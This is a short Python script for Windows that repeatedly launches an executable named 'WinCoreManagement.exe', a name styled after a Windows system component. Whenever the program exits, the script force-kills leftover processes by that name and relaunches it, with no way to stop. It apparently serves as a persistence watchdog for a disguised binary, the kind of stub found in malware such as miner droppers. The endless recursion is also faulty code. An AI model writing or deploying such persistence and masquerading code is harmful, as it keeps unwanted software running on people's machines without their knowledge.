import frozen
import multiprocessing
import subprocess, time, sys, os
import win32con
import win32api

CMD = r"WinCoreManagement.exe"



def run(cmd):
    os.chdir(os.path.dirname(os.path.abspath(__file__)))
    p = subprocess.Popen(cmd, shell=True)
    p.wait()
    try:
        subprocess.call('start /b taskkill /F /IM %s' % CMD)
    except Exception as e:
        pass

    run(cmd)

if __name__ == '__main__':
    multiprocessing.freeze_support()

    run(CMD)